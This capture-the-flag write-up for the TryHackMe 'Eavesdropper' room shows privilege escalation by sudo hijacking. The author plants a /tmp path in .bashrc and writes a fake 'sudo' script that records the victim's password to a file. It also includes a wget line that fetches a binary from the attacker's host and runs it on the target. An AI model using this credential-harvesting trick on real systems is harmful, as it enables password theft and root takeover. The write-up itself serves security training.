# Eavesdropper

## Introduction

Welcome to my another writeup! In this TryHackMe [Eavesdropper](https://tryhackme.com/room/eavesdropper) room, you'll learn: Sudo hijacking and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: frank to root](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> Listen closely, you might hear a password!
> 
> Difficulty: Medium

---

## Task 1 - Download Keys

Hello again, hacker. After uncovering a user Frank's SSH private key, you've broken into a target environment.

**Download the SSH private key attached.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Eavesdropper/images/Pasted%20image%2020230206081627.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Eavesdropper)-[2023.02.06|08:17:03(HKT)]
└> file idrsa.id-rsa 
idrsa.id-rsa: OpenSSH private key
```

## Task 2 - Find the Flag

You have access under `frank`, but you want to be `root`! How can you escalate privileges? If you listen closely, maybe you can uncover something that might help!

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Eavesdropper)-[2023.02.06|08:18:02(HKT)]
└> export RHOSTS=10.10.173.171
┌[siunam♥earth]-(~/ctf/thm/ctf/Eavesdropper)-[2023.02.06|08:18:12(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4d1b67084a1900d584d1568cd2ee6bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsR2LNIDi4KR/bXYHQTCfA0bBHEvccQ3bxmfbvG9B5BXmnVFTYXPLq0UOjyzeGvBrg90JpE2hbTUJKUCsAbN4u2LomrbEFZy0TO2o84GMk87d+1e0Q36XOiBkyotoRM/jMjJ61ycuGYmLSd3AfKdFYtzUu/ZGbuo3Xc8A2mEoGkmJx2m5Jr7Eq1FlPf6Dm94J4Dq8uLe3zp/qdlFJiz4rZwIcb37gBilW2qEqcDmD8zuKnZUjQFkCexcgRC6hvpKwFfM3+QswEvmqM8E7dZ6Eh1iKmtCDOe5sAcri6PKfz/rT0U6BD5YB7pZ3Tj87JfayCzQ4gOcxaHP6v39rZ5TIEmTrsAZ2Mu9qxvi9ihw8zNYHwsbvQMdiiE7mYAlFw3gp0FWTD7JfDon8f0IizttRgoXh6OdhP+ObYaYDjorCr2qzeg0gwE9rHDT9yiW+DnyDrP96CGvEwtw7M2IdxXtepsrAf1QPUnKAqqcBhlw9rySe9fbpKRBIquuqAsGvBgoc=
|   256 aadae41a0128d15d006f3768ec6e86cb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiMFA8YwcUYi7kCckMJcecGefZn0POGad1Q0iIb0J0GHq7dCSpYz3E3iGMzymUZ91jVn8r7JD9bplRcjqwRyac=
|   256 4263906e9f1a8bc4f7bbaa23a25f928f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMV1OD+yqzzQjOiL+6U0m5CsDj25+iLf919tu6AdvvxB
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 1 port is opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu

## Initial Foothold

In task 1 and 2 description, we know that there is a user called `frank` and downloaded he's private SSH key!

**Let's use that key to SSH into user `frank`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Eavesdropper)-[2023.02.06|08:21:43(HKT)]
└> chmod 600 idrsa.id-rsa 
┌[siunam♥earth]-(~/ctf/thm/ctf/Eavesdropper)-[2023.02.06|08:21:47(HKT)]
└> ssh -i idrsa.id-rsa frank@$RHOSTS
[...]
frank@workstation:~$ whoami;hostname;id;ip a
frank
workstation
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

I'm user `frank`!

## Privilege Escalation

### frank to root

Let's do some basic enumerations!

**Capabilities:**
```shell
frank@workstation:~$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
```

**Found `.dockerenv` file in `/`:**
```shell
frank@workstation:~$ ls -lah /
[...]
-rwxr-xr-x   1 root root    0 Mar 14  2022 .dockerenv
```

According to the above `.dockerenv` file and this machine's IP address, it's clear that **we're inside a Docker container.**

**Listening ports:**
```shell
frank@workstation:~$ netstat -tunlp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:36587        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.11:50025        0.0.0.0:*                           -                
```

`127.0.0.11` is listening on port 36587?

**Group:**
```shell
frank@workstation:~$ id
uid=1000(frank) gid=1000(frank) groups=1000(frank),27(sudo)
```

As you can see, **user `frank` is inside the `sudo` group.**

**However, we don't know his password, so we couldn't execute any OS command as root.**

Hmm... Now I wonder **why `ping` binary has a Capability called `cap_net_raw`.**

According to [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_net_raw), `cap_net_raw` allows us to sniff traffic:

> [CAP_NET_RAW](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows a process to be able to **create RAW and PACKET socket types** for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or **compromised container** to **spoof** **packets** at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.

However, I couldn't sniff any traffic via `ping`.

**Let's listen for system processes via `pspy`**:
```shell
┌[siunam♥earth]-(/opt/pspy)-[2023.02.06|09:05:52(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
frank@workstation:~$ wget http://10.9.0.253:8000/pspy64 -O /tmp/pspy;chmod +x /tmp/pspy;/tmp/pspy
[...]
2023/02/06 01:07:25 CMD: UID=0    PID=14808  | sudo cat /etc/shadow 
2023/02/06 01:07:45 CMD: UID=0    PID=14809  | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/02/06 01:07:45 CMD: UID=0    PID=14810  | sshd: [accepted]     
2023/02/06 01:07:45 CMD: UID=0    PID=14811  | sshd: frank [priv]   
2023/02/06 01:07:45 CMD: UID=0    PID=14812  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2023/02/06 01:07:45 CMD: UID=0    PID=14813  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:07:45 CMD: UID=0    PID=14814  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:07:45 CMD: UID=0    PID=14815  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:07:45 CMD: UID=0    PID=14816  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:07:45 CMD: UID=0    PID=14817  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:07:45 CMD: UID=0    PID=14818  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:07:45 CMD: UID=0    PID=14819  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:07:45 CMD: UID=0    PID=14820  | sshd: frank [priv] 
[...]
2023/02/06 01:07:50 CMD: UID=0    PID=14853  | sudo cat /etc/shadow 
2023/02/06 01:08:10 CMD: UID=0    PID=14854  | sshd: [accepted]  
2023/02/06 01:08:10 CMD: UID=0    PID=14855  | sshd: [accepted]     
2023/02/06 01:08:10 CMD: UID=0    PID=14856  | sshd: frank [priv]   
2023/02/06 01:08:10 CMD: UID=0    PID=14857  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2023/02/06 01:08:10 CMD: UID=0    PID=14858  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:08:10 CMD: UID=0    PID=14859  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:08:10 CMD: UID=0    PID=14860  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:08:10 CMD: UID=0    PID=14861  | /bin/sh /etc/update-motd.d/00-header 
2023/02/06 01:08:10 CMD: UID=0    PID=14862  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:08:10 CMD: UID=0    PID=14863  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:08:10 CMD: UID=0    PID=14864  | run-parts --lsbsysinit /etc/update-motd.d 
2023/02/06 01:08:10 CMD: UID=0    PID=14865  | sshd: frank [priv]   
```

So, it seems like every 25 seconds, there is a process that'll run `sudo cat /etc/shadow`.

**Now, in Linux, everything is a file.**

That being said, the `sudo cat /etc/shadow` process is a file!

So, techniquely we can view that file in `/proc/<process_id>/fd`! (fd means File Descriptor)

```shell
frank@workstation:~$ ls -lah /proc/*/fd/*
ls: cannot access '/proc/366/fd/3': No such file or directory
ls: cannot access '/proc/self/fd/255': No such file or directory
ls: cannot access '/proc/self/fd/3': No such file or directory
ls: cannot access '/proc/thread-self/fd/255': No such file or directory
ls: cannot access '/proc/thread-self/fd/3': No such file or directory
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/366/fd/0 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/366/fd/1 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/366/fd/2 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/366/fd/255 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/self/fd/0 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/self/fd/1 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/self/fd/2 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/thread-self/fd/0 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/thread-self/fd/1 -> /dev/pts/0
lrwx------ 1 frank frank 64 Feb  6 01:19 /proc/thread-self/fd/2 -> /dev/pts/0
```

Hmm... Maybe we can read the `sudo cat /etc/shadow` file descriptor??

**Armed with above information, we can run a Bash while true loop, and hopefully we can read that file:**
```shell
frank@workstation:~$ while true;do cat /proc/*/fd/3;done 2>/dev/null
```

But no dice...

Let's take a step back.

Before the process `cat /etc/shadow`, it'll have to run `sudo` first, which will then prompt a password prompt!

```shell
2023/02/06 06:46:21 CMD: UID=1000 PID=17382  | sshd: frank@pts/2    
2023/02/06 06:46:21 CMD: UID=0    PID=17383  | sudo cat /etc/shadow
```

Hmm... **Why not just let the password prompt give us the correct password of user `frank`? :D**

To do so, I'll export a new `PATH` environment variable, then create an evil Bash script called `sudo` to read the process's password:

- Export new `PATH` environment variable:

Normally you would do it via the `export` command. This time however, we need to do it in the `.bashrc`, as the process is using SSH to connect into user `frank`.

```shell
frank@workstation:~$ vi .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
[...]
```

- Create an evil Bash script called `sudo` in `/tmp`:

```shell
frank@workstation:~$ cd /tmp
frank@workstation:/tmp$ vi sudo 
#!/bin/bash

read -sp '[sudo] password for frank: ' password

echo -e "\n"
echo $password > /tmp/password.txt

frank@workstation:/tmp$ chmod +x sudo
```

- Wait for the process ran:

```shel
2023/02/06 07:27:33 CMD: UID=1000 PID=30507  | sshd: frank@pts/2    
2023/02/06 07:27:34 CMD: UID=0    PID=30509  | sudo cat /etc/shadow
```

```shell
frank@workstation:~$ cat /tmp/password.txt 
{Redacted}
```

Nice! We now have user `frank`'s password!

**Now, remember user `frank` is inside the `sudo` group, which means he can run any OS command as root!**

**But first, let's set our `PATH` environment variable back to normal:**
```shell
frank@workstation:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

**Then we can run the real `sudo` command:**
```shell
frank@workstation:~$ sudo -l
[sudo] password for frank: 
Matching Defaults entries for frank on workstation:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User frank may run the following commands on workstation:
    (ALL : ALL) ALL
```

**Nice! Let's Switch User to root!**
```shell
frank@workstation:~$ sudo su root
root@workstation:/home/frank# whoami;hostname;id;ip a
root
workstation
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
7: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**flag.txt:**
```shell
root@workstation:/home/frank# cat /root/flag.txt 
flag{Redacted}
```

# Conclusion

What we've learned:

1. Sudo Hijacking